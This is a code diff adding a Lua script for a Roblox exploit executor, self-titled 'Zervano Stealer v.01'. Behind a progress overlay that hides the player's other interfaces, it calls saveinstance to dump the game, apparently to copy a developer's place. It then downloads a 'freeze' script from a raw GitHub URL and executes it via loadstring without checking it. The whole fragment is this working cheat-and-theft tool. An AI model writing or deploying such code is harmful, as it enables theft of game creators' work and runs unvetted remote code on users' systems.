+        BarBg.BackgroundTransparency = 1
+        BarFill.BackgroundTransparency = 1
+        PercentText.TextTransparency = 1
+        TweenService:Create(Overlay, TweenInfo.new(duration), {BackgroundTransparency = 0}):Play()
+        TweenService:Create(StealText, TweenInfo.new(duration + 0.1), {TextTransparency = 0}):Play()
+        TweenService:Create(OverlaySub, TweenInfo.new(duration + 0.15), {TextTransparency = 0}):Play()
+        TweenService:Create(OverlayLogo, TweenInfo.new(duration + 0.1), {BackgroundTransparency = 0}):Play()
+        TweenService:Create(OverlayLogoInner, TweenInfo.new(duration + 0.15), {BackgroundTransparency = 0}):Play()
+        TweenService:Create(ringOuterStroke, TweenInfo.new(duration + 0.15), {Transparency = 0.6}):Play()
+        TweenService:Create(BarBg, TweenInfo.new(duration + 0.15), {BackgroundTransparency = 0}):Play()
+        TweenService:Create(BarFill, TweenInfo.new(duration + 0.15), {BackgroundTransparency = 0}):Play()
+        TweenService:Create(PercentText, TweenInfo.new(duration + 0.15), {TextTransparency = 0}):Play()
+    else
+        local tweens = {
+            TweenService:Create(Overlay, TweenInfo.new(duration), {BackgroundTransparency = 1}),
+            TweenService:Create(StealText, TweenInfo.new(duration), {TextTransparency = 1}),
+            TweenService:Create(OverlaySub, TweenInfo.new(duration), {TextTransparency = 1}),
+            TweenService:Create(OverlayLogo, TweenInfo.new(duration), {BackgroundTransparency = 1}),
+            TweenService:Create(OverlayLogoInner, TweenInfo.new(duration), {BackgroundTransparency = 1}),
+            TweenService:Create(ringOuterStroke, TweenInfo.new(duration), {Transparency = 1}),
+            TweenService:Create(BarBg, TweenInfo.new(duration), {BackgroundTransparency = 1}),
+            TweenService:Create(BarFill, TweenInfo.new(duration), {BackgroundTransparency = 1}),
+            TweenService:Create(PercentText, TweenInfo.new(duration), {TextTransparency = 1}),
+        }
+        for _, t in ipairs(tweens) do t:Play() end
+        tweens[1].Completed:Connect(function()
+            Overlay.Visible = false
+        end)
+    end
+end
+
+local function setProgress(p)
+    p = math.clamp(p, 0, 1)
+    TweenService:Create(BarFill, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+        Size = UDim2.new(p, 0, 1, 0),
+    }):Play()
+    PercentText.Text = tostring(math.floor(p * 100)) .. "%"
+end
+
+-- ============================================================
+-- Loader logic
+-- ============================================================
+local started = false
+local originalGuiStates = {}
+
+local function setStatus(text, color)
+    Status.Text = text
+    Status.TextColor3 = color or COLORS.textDim
+    statusDot.BackgroundColor3 = color or COLORS.textMuted
+    statusHalo.BackgroundColor3 = color or COLORS.textMuted
+    print("[Zervano] " .. text)
+end
+
+local function setButtonBusy(busy, label)
+    Button:SetAttribute("Busy", busy or nil)
+    if busy then
+        Button.Text = label or "WORKING..."
+        tweenButton(COLORS.btnBusy)
+        btnStroke.Transparency = 0.9
+    else
+        tweenButton(COLORS.btnIdle)
+        btnStroke.Transparency = 0.5
+    end
+end
+
+-- Save which GUIs we hid so we can restore them later
+local function snapshotAndHide()
+    table.clear(originalGuiStates)
+
+    local playerGui = player:FindFirstChildOfClass("PlayerGui")
+    if playerGui then
+        for _, gui in ipairs(playerGui:GetChildren()) do
+            if gui:IsA("ScreenGui") and gui ~= ScreenGui then
+                table.insert(originalGuiStates, {gui = gui, enabled = gui.Enabled})
+                gui.Enabled = false
+            end
+        end
+    end
+
+    pcall(function()
+        for _, gui in ipairs(CoreGui:GetChildren()) do
+            if gui:IsA("ScreenGui") and gui ~= ScreenGui then
+                table.insert(originalGuiStates, {gui = gui, enabled = gui.Enabled})
+                gui.Enabled = false
+            end
+        end
+    end)
+
+    hideAllOtherGuis()
+end
+
+local function restoreGuis()
+    for _, entry in ipairs(originalGuiStates) do
+        pcall(function()
+            if entry.gui and entry.gui.Parent then
+                entry.gui.Enabled = entry.enabled
+            end
+        end)
+    end
+    table.clear(originalGuiStates)
+
+    -- Restore CoreGui elements
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, true) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true) end)
+    pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true) end)
+end
+
+Button.MouseButton1Click:Connect(function()
+    if started then
+        setStatus("Already running...", COLORS.warn)
+        return
+    end
+    started = true
+    setButtonBusy(true, "WORKING...")
+
+    -- Hide all other GUIs, then show our white overlay
+    pcall(snapshotAndHide)
+    fadeOverlay(true)
+    setProgress(0)
+
+    task.spawn(function()
+        for i = 1, 5 do
+            setProgress(i / 20)
+            task.wait(0.06)
+        end
+
+        -- 1) saveinstance
+        setStatus("Calling saveinstance...", COLORS.warn)
+
+        if type(saveinstance) == "function" then
+            local ok, err = pcall(saveinstance)
+            if ok then
+                setStatus("saveinstance completed", COLORS.ok)
+            else
+                setStatus("saveinstance error: " .. tostring(err), COLORS.err)
+                warn("[Zervano] saveinstance error: " .. tostring(err))
+            end
+        else
+            setStatus("saveinstance not available", COLORS.err)
+            warn("[Zervano] Solara has no built-in saveinstance")
+        end
+
+        setProgress(0.45)
+        task.wait(0.3)
+
+        -- 2) Freeze script
+        setStatus("Loading freeze script...", COLORS.warn)
+
+        local ok2, source = pcall(game.HttpGet, game,
+            "https://raw.githubusercontent.com/mightmight41/freeze/refs/heads/main/main.lua", true)
+
+        if not ok2 or type(source) ~= "string" or source == "" then
+            setStatus("Freeze download failed", COLORS.err)
+            warn("[Zervano] Freeze download failed: " .. tostring(source))
+            setProgress(1)
+        else
+            setProgress(0.75)
+
+            local chunk, err2 = loadstring(source, "freeze")
+            if not chunk then
+                setStatus("Freeze compilation failed", COLORS.err)
+                warn("[Zervano] Freeze compile error: " .. tostring(err2))
+                setProgress(1)
+            else
+                local ok3, err3 = pcall(chunk)
+                if not ok3 then
+                    setStatus("Freeze execution failed", COLORS.err)
+                    warn("[Zervano] Freeze execution error: " .. tostring(err3))
+                    setProgress(1)
+                else
+                    setProgress(1)
+                    setStatus("Completed.", COLORS.ok)
+                    setButtonBusy(false)
+                    Button.BackgroundColor3 = COLORS.btnDone
+                    Button.Text = "COMPLETED"
+                end
+            end
+        end
+
+        task.wait(0.6)
+
+        -- Fade out overlay, then restore other GUIs
+        fadeOverlay(false, 0.5)
+        task.wait(0.55)
+        pcall(restoreGuis)
+    end)
+end)
+
+print("[Zervano Stealer v.01] GUI ready.")
